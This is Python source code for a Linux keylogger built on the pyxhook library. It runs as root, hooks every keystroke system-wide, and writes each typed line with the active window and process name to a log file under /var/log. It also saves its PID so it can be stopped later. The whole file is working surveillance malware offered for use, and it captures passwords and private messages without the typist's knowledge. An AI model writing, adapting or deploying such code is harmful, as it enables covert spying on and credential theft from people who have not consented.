import pyxhook
from signal import SIGKILL
from string import ascii_uppercase
import argparse
from os import getpid, kill, getuid
from os.path import isdir, exists, isfile
import sys


__author__ = "h3r0cybersec"
__version__ = "0.5"

# PID informations

def is_running(pid):
    """
        Check if keylogger is active
    """
    if isdir('/proc/{}'.format(pid)):
        return True
    return False

def store_main_pid():
    """
        Save information about main process pid
    """
    pid = getpid()
    tmp = open(".pid", mode="w")
    tmp.write(str(pid))
    tmp.seek(0)
    tmp.close()

def retrive_main_pid():
    tmp = open(".pid")
    pid = tmp.read()
    return pid

# usefull special character for a better logging view  
chars_mapping =  {
    "key": {
        "Return": "\n",
        "space": " ",
        "BackSpace": "\b",
        "Alt_L": "",
        "Shift_L": "",
        "Shift_R": "",
        "Control_L": "",
        "Control_R": "",
        "Escape": "<ESC>",
        "Delete": "<CANC>",
        "Caps_Lock": "<CAPS_LOCK>",
        "Tab": "\t",
        "period": ".",
        "P_Divide": "/",
        "comma": ",",
        "minus": "-",
        "plus": "+",
        "P_Multiply": "*",
        "P_Subtract": "-",
        "P_Enter": "\n",
        "[65027]": "",  # don't ask why this has only the scan code without a proper name! This is the 'AltGR'
        "apostrophe": "'",
        "egrave": "è",
        "Left": "",
        "Right": "",
        "Up": "",
        "Down": "",
        "P_Home": "",
    },
    "shift": {
        "colon": ":",
        "exclam": "!",
        "quotedbl": '"',
        "sterling" : "£",
        "dollar": "$",
        "percent": "%",
        "ampersend": "&",
        "slash": "/",
        "parenleft": "(",
        "parenright": ")",
        "equal": "=",
        "question": "?",
        "igrave": "^",
        "less": ">",
        "egrave": "é",
        "plus": "*",
        "ograve": "ç",
        "agrave": "°",
        "ugrave": "§",
        "semicolon": ";",
        "underscore": "_"
    },
    "alt_gr": {

    }
}

# Hotkeys
alt_key = alt_gr_key = shift_key = ctrl_key = False

# Where log are stored 
outfile = r"/var/log/keylogger.log"

# Line logged. This will be saved in the file when user want write on a new line
text = ""

# This is the callback that react to key press 
def OnKeyPress(event):
    global text, outfile, alt_key, alt_gr_key, shift_key, ctrl_key
    if ctrl_key:
        text+=f"<Ctrl + {event.Key}>"
        ctrl_key = False
    elif alt_key:
        text+=f"<Alt + {event.Key}>"
        alt_key = False
    elif shift_key:
        if event.Key in ascii_uppercase:
            text += event.Key
        else:
            text+=f"{chars_mapping['shift'].get(event.Key, '<NM>')}"
        shift_key = False
    elif alt_gr_key:
        text+=f"<AltGR + {event.Key}>"
        alt_gr_key = False
    else:
        if event.Key in chars_mapping["key"]:
            if event.Key == "Shift_L" or event.Key == "Shift_R":
                shift_key = True
            elif event.Key == "Control_L" or event.Key == "Control_R":
                ctrl_key = True
            elif event.Key == "[65027]":
                alt_gr_key = True
            else:
                if event.Key == "Return" or event.Key == "P_Enter":
                    fd = open(outfile, "a")
                    fd.write(f"WindowName: {event.WindowName}, ProcName: {event.WindowProcName}, Key: {text}{chars_mapping['key']['Return']}")
                    fd.close()
                    text = ""
                else:
                    text += chars_mapping["key"].get(event.Key)
        else:
           text += event.Key

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Keylogger")
    parser.add_argument("-s", "--start", help="start keylogger", action="store_false")
    parser.add_argument("-v", "--version", help="version", action="store_true")
    parser.add_argument("-k", "--kill", help="kill keylogger", action="store_true")
    parser.add_argument("-o", "--output", help="file store location", default="/var/log/keylogger.log")

    args = vars(parser.parse_args())
    
    if args["version"]:
        print(f"Version: {__version__}\nAuthor: {__author__}")
        sys.exit(0)

    if args["kill"]:
        pid = int(retrive_main_pid())
        if is_running(pid):
            kill(pid, SIGKILL)
            sys.exit(0)

    if args["output"]:
        if exists(args["output"]) and isfile(args["output"]):
            outfile = args["output"]
        else:
            print("[!] File not found")
            sys.exit(1)

    if args["start"]:
        try:
            if not getuid() == 0:
                raise PermissionError
            store_main_pid()
            hook = pyxhook.HookManager()
            hook.KeyDown = OnKeyPress
            hook.HookKeyboard()
            hook.start()
        except PermissionError:
            print("[!] Run as root")
            sys.exit(1)